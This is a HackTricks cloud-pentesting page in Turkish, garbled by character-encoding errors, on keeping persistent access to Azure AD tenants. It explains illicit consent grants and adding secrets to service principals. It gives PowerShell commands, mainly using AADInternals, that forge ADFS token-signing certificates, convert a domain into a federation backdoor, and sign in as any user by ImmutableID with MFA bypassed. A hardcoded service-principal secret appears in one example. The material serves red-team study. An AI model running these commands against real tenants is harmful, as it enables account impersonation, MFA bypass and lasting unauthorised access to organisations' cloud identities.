# Az - KalÄ±cÄ±lÄ±k

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

### YasadÄ±ÅŸÄ± Onay Verme

VarsayÄ±lan olarak, herhangi bir kullanÄ±cÄ± Azure AD'de bir uygulama kaydedebilir. Bu nedenle, hedef kiracÄ± iÃ§in yÃ¼ksek etkili izinlere ihtiyaÃ§ duyan bir uygulama kaydedebilirsiniz (yÃ¶netici onayÄ± ile onaylarsanÄ±z) - Ã¶rneÄŸin, bir kullanÄ±cÄ±nÄ±n adÄ±na posta gÃ¶nderme, rol yÃ¶netimi vb. Bu, baÅŸarÄ±lÄ± olmasÄ± durumunda **Ã§ok verimli** olacak **saldÄ±rÄ±larÄ± yÃ¼rÃ¼tmemize** izin verecektir.

AyrÄ±ca, bu uygulamayÄ± kendi kullanÄ±cÄ±nÄ±zla kabul ederek eriÅŸimi sÃ¼rdÃ¼rmenin bir yolu olabilir.

### Uygulamalar ve Hizmet Ä°lkeleri

Uygulama YÃ¶neticisi, GA veya microsoft.directory/applications/credentials/update izinleri olan Ã¶zel bir rol ile kimlik doÄŸrulama bilgilerini (ÅŸifre veya sertifika) mevcut bir uygulamaya ekleyebiliriz.

YÃ¼ksek izinlere sahip bir uygulamayÄ± hedef almak veya yÃ¼ksek izinlere sahip yeni bir uygulama eklemek mÃ¼mkÃ¼ndÃ¼r.

Uygulamaya eklemek iÃ§in ilginÃ§ bir rol **AyrÄ±calÄ±klÄ± kimlik doÄŸrulama yÃ¶neticisi rolÃ¼** olabilir Ã§Ã¼nkÃ¼ bu, **Global YÃ¶neticilerin ÅŸifresini sÄ±fÄ±rlamaya** izin verir.

Bu teknik ayrÄ±ca **MFA'yÄ± atlamaya** olanak tanÄ±r.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Sertifika tabanlÄ± kimlik doÄŸrulama iÃ§in
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
### Federasyon - Token Ä°mzalama SertifikasÄ±

On-prem AD'de **DA ayrÄ±calÄ±klarÄ±** ile, Ã§ok uzun bir geÃ§erliliÄŸe sahip olan **yeni Token imzalama** ve **Token Åifreleme sertifikalarÄ±** oluÅŸturmak ve bunlarÄ± iÃ§e aktarmak mÃ¼mkÃ¼ndÃ¼r. Bu, bize **ImmutableID'sini** bildiÄŸimiz herhangi bir kullanÄ±cÄ± olarak **oturum aÃ§mamÄ±za** izin verecektir.

AÅŸaÄŸÄ±daki komutu **ADFS sunucusunda DA olarak Ã§alÄ±ÅŸtÄ±rÄ±n** yeni sertifikalar oluÅŸturmak iÃ§in (varsayÄ±lan ÅŸifre 'AADInternals'), bunlarÄ± ADFS'e ekleyin, otomatik yenilemeyi devre dÄ±ÅŸÄ± bÄ±rakÄ±n ve hizmeti yeniden baÅŸlatÄ±n:
```powershell
New-AADIntADFSSelfSignedCertificates
```
ArdÄ±ndan, Azure AD ile sertifika bilgilerini gÃ¼ncelleyin:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federasyon - GÃ¼venilen Etki AlanÄ±

Bir kiracÄ±da GA ayrÄ±calÄ±klarÄ±yla, **yeni bir etki alanÄ± eklemek** mÃ¼mkÃ¼ndÃ¼r (doÄŸrulanmÄ±ÅŸ olmalÄ±), kimlik doÄŸrulama tÃ¼rÃ¼nÃ¼ Federasyon olarak yapÄ±landÄ±rmak ve etki alanÄ±nÄ± **belirli bir sertifikaya gÃ¼venen** (aÅŸaÄŸÄ±daki komutta any.sts) ve yayÄ±ncÄ±yÄ± yapÄ±landÄ±rmak iÃ§in:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Referanslar

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
AWS Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}
